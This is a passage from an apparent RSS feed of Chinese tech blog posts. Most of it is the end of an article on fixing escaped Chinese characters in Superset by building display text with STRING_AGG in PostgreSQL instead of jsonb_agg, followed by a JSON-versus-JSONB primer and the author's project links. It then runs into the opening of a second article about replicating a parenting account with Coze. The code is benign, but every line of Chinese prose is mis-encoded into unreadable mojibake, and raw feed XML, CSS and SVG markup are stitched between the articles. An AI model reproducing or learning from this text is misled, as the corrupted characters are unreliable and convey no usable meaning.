<p>ç¬¬ä¸€ååº”é€šå¸¸æ˜¯ï¼š"æ˜¯ä¸æ˜¯æ•°æ®åº“ç¼–ç ä¸å¯¹ï¼Ÿ" æˆ–è€… "Superset çš„ç¼–ç è®¾ç½®æœ‰é—®é¢˜ï¼Ÿ"</p>
<p>ä½†ä»”ç»†ä¸€å¯¹æ¯”å‘ç°ï¼š</p>
<ol>
<li><strong>DBeaver æŸ¥è¯¢</strong>ï¼šæ˜¾ç¤ºå®Œç¾ä¸­æ–‡ã€‚</li>
<li><strong>Superset å±•ç¤º</strong>ï¼šæ˜¾ç¤º Unicode è½¬ä¹‰ç¬¦ã€‚</li>
</ol>
<p>è¿™è¯´æ˜æ•°æ®åº“é‡Œå­˜çš„æ•°æ®æœ¬èº«æ²¡é—®é¢˜ã€‚é—®é¢˜å‡ºåœ¨<strong>ä»æ•°æ®åº“å–å‡ºæ¥ï¼Œåˆ°å‘ç»™æµè§ˆå™¨</strong>çš„è¿™æ®µè·¯ä¸Šã€‚</p>
<h3 data-id="heading-3">çœŸå‡¶ï¼šPython çš„ <code>json.dumps</code></h3>
<p>Superset åç«¯æ˜¯ Python å†™çš„ã€‚å½“å®ƒä» PostgreSQL (é€šè¿‡ <code>psycopg2</code> é©±åŠ¨) æ‹¿åˆ° <code>JSONB</code> ç±»å‹çš„æ•°æ®æ—¶ï¼ŒPython ä¼šæŠŠå®ƒè½¬æ¢æˆå­—å…¸ï¼ˆDictï¼‰ã€‚</p>
<p>å…³é”®ä¸€æ­¥æ¥äº†ï¼šSuperset è¦æŠŠè¿™ä¸ªå­—å…¸ä¼ ç»™å‰ç«¯ï¼Œéœ€è¦æŠŠå®ƒåºåˆ—åŒ–æˆå­—ç¬¦ä¸²ã€‚è¿™æ—¶å€™å®ƒï¼ˆæˆ–è€…åº•å±‚çš„åº“ï¼‰å¤§æ¦‚ç‡è°ƒç”¨äº† Python æ ‡å‡†åº“çš„ <code>json.dumps</code>ã€‚</p>
<p>åœ¨ Python é‡Œï¼Œ<code>json.dumps</code> æœ‰ä¸ªé»˜è®¤è¡Œä¸ºï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> json
data = {<span class="hljs-string">"msg"</span>: <span class="hljs-string">"ä½ å¥½"</span>}

<span class="hljs-comment"># é»˜è®¤ ensure_ascii=True</span>
<span class="hljs-built_in">print</span>(json.dumps(data))
<span class="hljs-comment"># è¾“å‡º: {"msg": "\u4f60\u597d"}  &lt;-- ä¹Ÿå°±æ˜¯æˆ‘ä»¬çœ‹åˆ°çš„"ä¹±ç "</span>
</code></pre>
<p>è¿™ä¸ª <code>ensure_ascii=True</code> é»˜è®¤å¼€å¯ï¼ŒåŸæœ¬æ˜¯ä¸ºäº†å…¼å®¹æ€§â€”â€”ç¡®ä¿ä¸ç®¡å¯¹æ–¹ç³»ç»Ÿå¤šè€æ—§ï¼Œåªè¦èƒ½è®¤ ASCII ç å°±ä¸ä¼šå´©ã€‚ä½†åœ¨æˆ‘ä»¬è¿™ä¸ªåœºæ™¯ä¸‹ï¼Œå®ƒå°±æˆäº†"å¥½å¿ƒåŠåäº‹"ï¼ŒæŠŠåŸæœ¬èƒ½æ­£å¸¸æ˜¾ç¤ºçš„ UTF-8 ä¸­æ–‡å¼ºè¡Œè½¬ä¹‰äº†ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆ DBeaver æ²¡äº‹ï¼Ÿ</strong>
å› ä¸º DBeaver æ˜¯ä¸ªæˆç†Ÿçš„å®¢æˆ·ç«¯ï¼Œå®ƒæ‹¿åˆ°æ•°æ®ååœ¨æœ¬åœ°åšäº†è§£æå’Œæ¸²æŸ“ï¼Œå®ƒ"è®¤è¯†"è¿™äº› Unicode å­—ç¬¦ï¼Œæ‰€ä»¥è´´å¿ƒåœ°å¸®ä½ è½¬å›äº†ä¸­æ–‡ã€‚è€Œ Superset æŠŠå®ƒå½“æˆäº†æ™®é€šå­—ç¬¦ä¸²ç›´æ¥åäº†å‡ºæ¥ã€‚</p>
<h2 data-id="heading-4">æ€ä¹ˆè§£ï¼Ÿ</h2>
<p>æ—¢ç„¶çŸ¥é“äº†æ˜¯åºåˆ—åŒ–çš„é—®é¢˜ï¼Œæ”¹ Superset æºç å»å…³æ‰ <code>ensure_ascii</code> æ˜¾ç„¶åŠ¨é™å¤ªå¤§ï¼Œå®¹æ˜“"æ­¤æ—¶ä¸€æ—¶çˆ½ï¼Œå‡çº§ç«è‘¬åœº"ã€‚</p>
<p>æœ€ä¼˜é›…çš„åŠæ³•ï¼Œå…¶å®æ˜¯<strong>åœ¨æ•°æ®åº“å±‚å°±æŠŠæ ¼å¼ä¿®å¥½</strong>ã€‚</p>
<p>æ—¢ç„¶æˆ‘ä»¬çš„ç›®æ ‡æ˜¯"ç»™äººçœ‹"ï¼ˆè¿è¥çœ‹æ¿ï¼‰ï¼Œè€Œä¸æ˜¯ç»™ç¨‹åºè¯»ï¼Œé‚£ä¸ºä»€ä¹ˆè¦æ‰§ç€äºä¼  JSON æ ¼å¼å‘¢ï¼Ÿç›´æ¥æ‹¼æˆæ˜“è¯»çš„æ–‡æœ¬ä¸æ›´é¦™å—ï¼Ÿ</p>
<p>äºæ˜¯æˆ‘æŠŠ <code>jsonb_agg</code> æ¢æˆäº† <code>STRING_AGG</code>ï¼Œé¡ºæ‰‹è¿˜åŠ äº†ç‚¹ Emoji åšç¾åŒ–ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">(
    <span class="hljs-keyword">SELECT</span> STRING_AGG(
        <span class="hljs-keyword">CASE</span>
            <span class="hljs-keyword">WHEN</span> tm.role <span class="hljs-operator">=</span> <span class="hljs-string">'user'</span> <span class="hljs-keyword">THEN</span> <span class="hljs-string">'ğŸ‘¤ '</span> <span class="hljs-operator">||</span> tm.content      <span class="hljs-comment">-- ç”¨æˆ·è¯´è¯åŠ ä¸ªå°äºº</span>
            <span class="hljs-keyword">WHEN</span> tm.role <span class="hljs-operator">=</span> <span class="hljs-string">'assistant'</span> <span class="hljs-keyword">THEN</span> <span class="hljs-string">'ğŸ¤– '</span> <span class="hljs-operator">||</span> tm.content <span class="hljs-comment">-- AI å›å¤åŠ ä¸ªæœºå™¨äºº</span>
            <span class="hljs-keyword">ELSE</span> tm.role <span class="hljs-operator">||</span> <span class="hljs-string">': '</span> <span class="hljs-operator">||</span> tm.content
        <span class="hljs-keyword">END</span>,
        E<span class="hljs-string">'\n\n'</span> <span class="hljs-comment">-- ç”¨æ¢è¡Œç¬¦éš”å¼€ï¼Œæ¸…æ™°æ˜äº†</span>
        <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> tm.message_order
    )
    <span class="hljs-keyword">FROM</span> task_messages tm
    <span class="hljs-keyword">WHERE</span> tm.task_id <span class="hljs-operator">=</span> t.id
) <span class="hljs-keyword">AS</span> å¯¹è¯è®°å½•
</code></pre>
<p><strong>è¿™æ ·æ”¹çš„ä¸¤ä¸ªçº¢åˆ©ï¼š</strong></p>
<ol>
<li><strong>å½»åº•ç»•è¿‡åºåˆ—åŒ–å‘</strong>ï¼šè¾“å‡ºå˜æˆäº†çº¯æ–‡æœ¬ï¼ˆTextï¼‰ï¼ŒSuperset æ‹¿åˆ°ä»€ä¹ˆå°±æ˜¾ç¤ºä»€ä¹ˆï¼ŒPython å†ä¹Ÿä¸ä¼šè‡ªä½œå¤šæƒ…å»è½¬ä¹‰å®ƒã€‚</li>
<li><strong>è¿è¥ä½“éªŒæ‹‰æ»¡</strong>ï¼šå»æ‰äº†å†·å†°å†°çš„ <code>{"role":...}</code> èŠ±æ‹¬å·å’Œå¼•å·ï¼Œç›´æ¥æ˜¾ç¤ºå¯¹è¯æµï¼Œè¿è¥åŒå­¦çœ‹æ•°æ®çœ¼ç›ä¹Ÿä¸ç´¯äº†ã€‚</li>
</ol>
<h2 data-id="heading-5">é™„ï¼šæ·±åº¦ç§‘æ™® PostgreSQL çš„ JSONB</h2>
<p>æ—¢ç„¶æåˆ°äº† JSONBï¼Œé¡ºä¾¿å¤šèŠä¸¤å¥ã€‚å¾ˆå¤šåŒå­¦ä» MySQL è½¬è¿‡æ¥ï¼Œå¯èƒ½è§‰å¾—"ä¸å°±æ˜¯å­˜ JSON å˜›ï¼Œæœ‰å•¥åŒºåˆ«ï¼Ÿ"</p>
<p>å…¶å® PG é‡Œçš„ <code>json</code> å’Œ <code>jsonb</code> å®Œå…¨æ˜¯ä¸¤ä¸ªç‰©ç§ã€‚</p>
<h3 data-id="heading-6">1. å®ƒæ˜¯"ç†Ÿ"çš„ï¼Œä¸æ˜¯"ç”Ÿ"çš„</h3>
<ul>
<li><strong>JSON</strong> ç±»å‹å°±åƒæŠŠè‚‰å†»åœ¨å†°ç®±é‡Œï¼Œä½ å­˜è¿›å»æ˜¯ä»€ä¹ˆæ ·ï¼ˆåŒ…æ‹¬ç©ºæ ¼ã€é”®çš„é¡ºåºã€é‡å¤é”®ï¼‰ï¼Œå–å‡ºæ¥å°±æ˜¯ä»€ä¹ˆæ ·ã€‚å®ƒæœ¬è´¨ä¸Šå°±æ˜¯ä¸ª<strong>å¸¦æ ¡éªŒçš„æ–‡æœ¬</strong>ã€‚</li>
<li><strong>JSONB</strong> åˆ™æ˜¯æŠŠè‚‰åšæˆäº†ç†Ÿé£Ÿã€‚å­˜è¿›å»çš„æ—¶å€™ï¼Œæ•°æ®åº“ä¼šæŠŠå®ƒ<strong>è§£æã€å»é‡ã€æ’åº</strong>ï¼Œè½¬æ¢æˆä¸€ç§é«˜æ•ˆçš„<strong>äºŒè¿›åˆ¶æ ¼å¼</strong>ã€‚
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šè¯»çš„æ—¶å€™ä¸éœ€è¦é‡æ–°è§£æï¼Œé€Ÿåº¦é£å¿«ï¼›æ”¯æŒç´¢å¼•ã€‚</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šå†™å…¥æ—¶å¤šäº†ä¸€æ­¥è§£æï¼Œç¨å¾®æ…¢ä¸€ä¸¢ä¸¢ï¼›åŸæœ¬çš„ç©ºæ ¼å’Œæ ¼å¼ä¼šä¸¢å¤±ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7">2. æ€æ‰‹é”ï¼šGIN ç´¢å¼•</h3>
<p>JSONB æœ€å¤§çš„å¨åŠ›åœ¨äºå®ƒæ”¯æŒ <strong>GIN (Generalized Inverted Index) ç´¢å¼•</strong>ã€‚</p>
<p>å‡è®¾ä½ æœ‰ä¸€äº¿è¡Œæ—¥å¿—ï¼Œå­˜äº†ä¸ª <code>payload</code> å­—æ®µï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æŸ¥æ‰€æœ‰"ç”¨æˆ·IDä¸º10086"çš„æ“ä½œè®°å½•</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> logs <span class="hljs-keyword">WHERE</span> payload @<span class="hljs-operator">&gt;</span> <span class="hljs-string">'{"user_id": 10086}'</span>;
</code></pre>
<ul>
<li>å¦‚æœæ˜¯æ™®é€š <strong>JSON</strong>ï¼šæ•°æ®åº“å¾—ä¸€è¡Œè¡ŒæŠŠæ–‡æœ¬è¯»å‡ºæ¥ï¼Œè§£æï¼Œå†æ¯”å¯¹â€”â€”è¿™å°±æ˜¯ç¾éš¾ã€‚</li>
<li>å¦‚æœæ˜¯ <strong>JSONB + ç´¢å¼•</strong>ï¼šå®ƒå¯ä»¥ç›´æ¥å®šä½åˆ°åŒ…å«è¿™ä¸ªé”®å€¼å¯¹çš„è¡Œï¼Œé€Ÿåº¦å’ŒæŸ¥ä¸»é”®å·®ä¸å¤šã€‚</li>
</ul>
<h3 data-id="heading-8">3. é¿å‘æŒ‡å—ï¼šåˆ°åº•é€‰è°ï¼Ÿ</h3>



































<table><thead><tr><th align="left">åœºæ™¯</th><th align="left">æ¨èç±»å‹</th><th align="left">ç†ç”±</th></tr></thead><tbody><tr><td align="left"><strong>åªæ˜¯åšæ—¥å¿—å½’æ¡£</strong></td><td align="left"><strong>JSON</strong></td><td align="left">å†™å…¥å¿«ï¼ŒåŸæ ·ä¿ç•™åŸå§‹è¯·æ±‚ä½“ï¼ˆå“ªæ€•æ ¼å¼å¾ˆä¸‘ï¼‰</td></tr><tr><td align="left"><strong>Webç«¯é€ä¼ å‚æ•°</strong></td><td align="left"><strong>JSON</strong></td><td align="left">æ—¢ç„¶åç«¯ä¸å¤„ç†ï¼Œå°±åˆ«è´¹åŠ²è½¬äºŒè¿›åˆ¶äº†</td></tr><tr><td align="left"><strong>ç»å¸¸è¦æ ¹æ®å­—æ®µæŸ¥è¯¢</strong></td><td align="left"><strong>JSONB</strong></td><td align="left"><strong>å¿…é€‰</strong>ï¼Œä¸ºäº†ç”¨ç´¢å¼•</td></tr><tr><td align="left"><strong>é¢‘ç¹æ›´æ–°å±€éƒ¨å­—æ®µ</strong></td><td align="left"><strong>JSONB</strong></td><td align="left"><code>jsonb_set</code> ä¿®æ”¹æ€§èƒ½æ›´å¥½</td></tr><tr><td align="left"><strong>ç»™ BI å·¥å…·åšå±•ç¤º</strong></td><td align="left"><strong>Text</strong></td><td align="left">å°±åƒæœ¬æ–‡é‡åˆ°çš„å‘ï¼Œç›´æ¥ç”¨ SQL æ‹¼æˆå­—ç¬¦ä¸²æœ€å®‰å…¨ï¼</td></tr></tbody></table>
<h2 data-id="heading-9">å°ç»“</h2>
<p>é‡åˆ°è¿™ç§"æ•°æ®åº“æŸ¥ç€å¯¹ï¼Œå‰ç«¯æ˜¾ç¤ºä¹±"çš„é—®é¢˜ï¼Œå°¤å…¶æ˜¯æ¶‰åŠ JSON çš„æ—¶å€™ï¼Œå¤šåŠæ˜¯ä¸­é—´å±‚çš„åºåˆ—åŒ–é…ç½®åœ¨ä½œå¦–ã€‚</p>
<p>è™½ç„¶æŠ€æœ¯ä¸Šæˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®è§£å†³ç¼–ç é—®é¢˜ï¼Œä½†<strong>è½¬æ¢æ€ç»´</strong>å¾€å¾€èƒ½æ‰¾åˆ°æ›´å¥½çš„è·¯ï¼šæ—¢ç„¶æ˜¯åšå±•ç¤ºï¼Œä¸å¦‚ç›´æ¥åœ¨ SQL é‡ŒæŠŠæ•°æ®åŠ å·¥æˆæœ€é€‚åˆé˜…è¯»çš„æ ·å­ã€‚æ—¢è§£å†³äº†ä¹±ç ï¼Œåˆä¼˜åŒ–äº†æ’ç‰ˆï¼Œä¸€ä¸¾ä¸¤å¾—ã€‚</p>
<hr/>
<p>å¦‚æœä½ è§‰å¾—è¿™ç¯‡æ–‡ç« æœ‰å¸®åŠ©ï¼Œæ¬¢è¿å…³æ³¨æˆ‘çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">GitHub</a>ï¼Œä¸‹é¢æ˜¯æˆ‘çš„ä¸€äº›å¼€æºé¡¹ç›®ï¼š</p>
<p><strong>Claude Code Skills</strong>ï¼ˆæŒ‰éœ€åŠ è½½ï¼Œæ„å›¾è‡ªåŠ¨è¯†åˆ«ï¼Œä¸æµªè´¹ tokenï¼Œ<a href="https://juejin.cn/post/7578714735307735066" target="_blank" title="https://juejin.cn/post/7578714735307735066">ä»‹ç»æ–‡ç« </a>ï¼‰ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">code-review-skill</a> - ä»£ç å®¡æŸ¥æŠ€èƒ½ï¼Œè¦†ç›– React 19ã€Vue 3ã€TypeScriptã€Rust ç­‰çº¦ 9000 è¡Œè§„åˆ™ï¼ˆ<a href="https://juejin.cn/post/7578709098255908902" target="_blank" title="https://juejin.cn/post/7578709098255908902">è¯¦ç»†ä»‹ç»</a>ï¼‰</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2F5-whys-skill" target="_blank" title="https://github.com/tt-a1i/5-whys-skill" ref="nofollow noopener noreferrer">5-whys-skill</a> - 5 Whys æ ¹å› åˆ†æï¼Œè¯´"æ‰¾æ ¹å› "è‡ªåŠ¨æ¿€æ´»</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Ffirst-principles-skill" target="_blank" title="https://github.com/tt-a1i/first-principles-skill" ref="nofollow noopener noreferrer">first-principles-skill</a> - ç¬¬ä¸€æ€§åŸç†æ€è€ƒï¼Œé€‚åˆæ¶æ„è®¾è®¡å’ŒæŠ€æœ¯é€‰å‹</li>
</ul>
<p><strong>vibe coding åŸç†å­¦ä¹ </strong>ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcoding-cli-guide" target="_blank" title="https://github.com/tt-a1i/coding-cli-guide" ref="nofollow noopener noreferrer">coding-cli-guide</a>ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Ftt-a1i.github.io%2Fcoding-cli-guide%2F%3Ftab%3Dstart-here" target="_blank" title="https://tt-a1i.github.io/coding-cli-guide/?tab=start-here" ref="nofollow noopener noreferrer">å­¦ä¹ ç½‘ç«™</a>ï¼‰- å­¦ä¹  qwen-cli æ—¶æ•´ç†çš„ç¬”è®°ï¼Œ40+ äº¤äº’å¼åŠ¨ç”»æ¼”ç¤º AI CLI å†…éƒ¨æœºåˆ¶</li>
</ul>
<p><strong>å…¨æ ˆé¡¹ç›®</strong>ï¼ˆé€‚åˆå­¦ä¹ ç°ä»£æŠ€æœ¯æ ˆï¼‰ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fprompt-vault" target="_blank" title="https://github.com/tt-a1i/prompt-vault" ref="nofollow noopener noreferrer">prompt-vault</a> - Prompt ç®¡ç†å™¨ï¼Œç”¨çš„éƒ½æ˜¯æœ€æ–°çš„æŠ€æœ¯æ ˆï¼Œé€‚åˆç”¨æ¥å­¦ä¹ äº†è§£æœ€æ–°çš„å‰ç«¯å…¨æ ˆå¼€å‘èŒƒå¼ï¼šNext.js 15 + React 19 + tRPC 11 + Supabase å…¨æ ˆç¤ºä¾‹ï¼Œclone ä¸‹æ¥é…ä¸ªå…è´¹ Supabase å°±èƒ½è·‘</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fchat_edit" target="_blank" title="https://github.com/tt-a1i/chat_edit" ref="nofollow noopener noreferrer">chat_edit</a> - åŒæ¨¡å¼ AI åº”ç”¨ï¼ˆèŠå¤©+å¯Œæ–‡æœ¬ç¼–è¾‘ï¼‰ï¼ŒVue 3.5 + TypeScript + Vite 5 + Quill 2.0 + IndexedDB</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ä¼šç¼–ç¨‹ï¼Ÿæ²¡å…³ç³»ï¼åƒèŠå¤©ä¸€æ ·â€œè°ƒæ•™â€æ‰£å­ç¼–ç¨‹ï¼Œä½ çš„â€œç«å¦ˆè‚²å„¿â€å¤åˆ»ç‰ˆé©¬ä¸Šä¸Šçº¿]]></title>    <link>https://juejin.cn/post/7589171972447158314</link>    <guid>https://juejin.cn/post/7589171972447158314</guid>    <pubDate>2025-12-30T02:37:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589171972447158314" data-draft-id="7589172193151418404" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ä¼šç¼–ç¨‹ï¼Ÿæ²¡å…³ç³»ï¼åƒèŠå¤©ä¸€æ ·â€œè°ƒæ•™â€æ‰£å­ç¼–ç¨‹ï¼Œä½ çš„â€œç«å¦ˆè‚²å„¿â€å¤åˆ»ç‰ˆé©¬ä¸Šä¸Šçº¿"/> <meta itemprop="keywords" content="Coze"/> <meta itemprop="datePublished" content="2025-12-30T02:37:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¾é³´"/> <meta itemprop="url" content="https://juejin.cn/user/3683842894347076"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ä¼šç¼–ç¨‹ï¼Ÿæ²¡å…³ç³»ï¼åƒèŠå¤©ä¸€æ ·â€œè°ƒæ•™â€æ‰£å­ç¼–ç¨‹ï¼Œä½ çš„â€œç«å¦ˆè‚²å„¿â€å¤åˆ»ç‰ˆé©¬ä¸Šä¸Šçº¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3683842894347076/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¾é³´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:37:38.000Z" title="Tue Dec 30 2025 02:37:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å¾é³´ã€‚ä¸“æ³¨äºåˆ†äº«æå‡å·¥ä½œä¸ç”Ÿæ´»æ•ˆç‡çš„å·¥å…·ï¼Œæ— å¿åˆ†äº«AIé¢†åŸŸç›¸å…³çš„ç²¾é€‰æŠ¥å‘Šï¼ŒæŒç»­å…³æ³¨AIçš„å‰æ²¿åŠ¨å‘ã€‚</p>
<p>å‰ä¸ä¹…æœ‰ä½æœ‹å‹ç»™æˆ‘å‘äº†ä¸€ä¸ªè‚²å„¿è´¦å·ï¼Œé—®æˆ‘èƒ½ä¸èƒ½ä½¿ç”¨æ‰£å­è¿›è¡Œå¤åˆ»ï¼Ÿ</p>
<p>æˆ‘çœ‹äº†çœ‹è¿™ä¸ªè´¦å·ï¼Œéƒ½æ˜¯åˆ†äº«ä¸€äº›è‚²å„¿ç›¸å…³çš„å†…å®¹ï¼Œæ—¨åœ¨åˆ†äº«è‚²å„¿ç›¸å…³æŠ€å·§ï¼Œçœ‹äº†çœ‹æ•°æ®æŒºä¸é”™ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/145db8e9bd2b4a7a9a8337bdc1ceb77d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=P903c27JnrTAfJR1SwPFBWUmKZg%3D" alt="" loading="lazy"/></p>
<p>åˆ†æäº†ä¸€ä¸‹è¿™ä¸ªè´¦å·çš„æ–‡ç« å†…å®¹ï¼Œå…¶å®åˆ¶ä½œè¿‡ç¨‹ä¸ç®—å¤æ‚ï¼Œå¤§è‡´çš„æµç¨‹å°±æ˜¯å…ˆç”¨å¤§æ¨¡å‹æ ¹æ®ä¸»é¢˜ç”Ÿæˆæ–‡æ¡ˆï¼Œç„¶åå†å°†æ–‡æ¡ˆåˆ¶ä½œæˆä½“æ„Ÿæ›´å¥½çš„å›¾ç‰‡ã€‚</p>
